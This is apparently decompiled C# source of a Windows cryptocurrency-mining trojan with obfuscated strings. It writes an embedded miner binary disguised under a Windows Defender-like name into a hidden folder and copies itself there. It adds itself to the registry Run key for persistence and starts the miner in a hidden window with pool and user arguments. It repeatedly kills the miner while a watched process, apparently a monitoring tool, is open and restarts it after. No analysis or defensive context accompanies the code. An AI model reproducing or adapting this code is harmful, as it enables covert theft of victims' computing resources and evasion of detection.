using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using Microsoft.Win32;
using Miner1.Properties;

namespace instail
{
	// Token: 0x02000004 RID: 4
	internal class Program
	{
		// Token: 0x06000007 RID: 7 RVA: 0x000024CC File Offset: 0x000006CC
		private static void Main(string[] args)
		{
			Class6.kLjw4iIsCLsZtxc4lksN0j();
			Program.Install();
			Program.CopyFile();
			Program.SetAutorunValue(true);
			Program.StartMine();
			for (;;)
			{
				int num = 0;
				Process[] processes = Process.GetProcesses();
				foreach (Process process in processes)
				{
					if (process.ProcessName == Class2.smethod_11(20))
					{
						Process[] processesByName = Process.GetProcessesByName(Program._filename);
						if (processesByName.Length != 0)
						{
							processesByName[0].Kill();
						}
						num++;
					}
				}
				if (num == 0)
				{
					Process[] processesByName2 = Process.GetProcessesByName(Program._filename);
					if (processesByName2.Length == 0)
					{
						Program.StartMine();
					}
				}
				Thread.Sleep(500);
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002578 File Offset: 0x00000778
		private static void StartMine()
		{
			new Process
			{
				StartInfo = 
				{
					Arguments = string.Format(Class2.smethod_11(38), Program.proc, Program.pool, Program.user),
					FileName = Program.exeToRun,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					CreateNoWindow = true
				}
			}.Start();
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000025F0 File Offset: 0x000007F0
		public static void CopyFile()
		{
			if (!File.Exists(Program.direct + Class2.smethod_11(146)))
			{
				string location = Assembly.GetExecutingAssembly().Location;
				File.Copy(location, Program.direct + Class2.smethod_11(146));
			}
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002640 File Offset: 0x00000840
		public static bool SetAutorunValue(bool autorun)
		{
			string value = Program.direct + Class2.smethod_11(146);
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(Class2.smethod_11(172));
			try
			{
				if (!autorun)
				{
					registryKey.DeleteValue(Class2.smethod_11(268));
				}
				else
				{
					registryKey.SetValue(Class2.smethod_11(268), value);
				}
				registryKey.Flush();
				registryKey.Close();
			}
			catch
			{
				return false;
			}
			return true;
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000026C4 File Offset: 0x000008C4
		private static void Install()
		{
			byte[] msascuiL = Resources.MSASCuiL;
			if (!Directory.Exists(Program.direct))
			{
				Directory.CreateDirectory(Program.direct);
			}
			if (!File.Exists(Program.exeToRun))
			{
				using (FileStream fileStream = new FileStream(Program.exeToRun, FileMode.Create))
				{
					fileStream.Write(msascuiL, 0, msascuiL.Length);
				}
			}
		}

		// Token: 0x0600000C RID: 12 RVA: 0x0000223C File Offset: 0x0000043C
		public Program()
		{
			Class5.WNqmTthz2i6ny();
			base..ctor();
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002734 File Offset: 0x00000934
		static Program()
		{
			// Note: this type is marked as 'beforefieldinit'.
			Class6.kLjw4iIsCLsZtxc4lksN0j();
			Class5.WNqmTthz2i6ny();
			Program.direct = Class2.smethod_11(286);
			Program._filename = Class2.smethod_11(318);
			Program.proc = Class2.smethod_11(334);
			Program.pool = Class2.smethod_11(342);
			Program.user = Class2.smethod_11(430);
			Program.filename = Program._filename + Class2.smethod_11(466);
			Program.exeToRun = Program.direct + Class2.smethod_11(478) + Program.filename;
			Program.ExePath = "";
		}

		// Token: 0x04000003 RID: 3
		private static string direct;

		// Token: 0x04000004 RID: 4
		private static string _filename;

		// Token: 0x04000005 RID: 5
		private static string proc;

		// Token: 0x04000006 RID: 6
		private static string pool;

		// Token: 0x04000007 RID: 7
		private static string user;

		// Token: 0x04000008 RID: 8
		private static string filename;

		// Token: 0x04000009 RID: 9
		private static string exeToRun;

		// Token: 0x0400000A RID: 10
		private static string ExePath;
	}
}
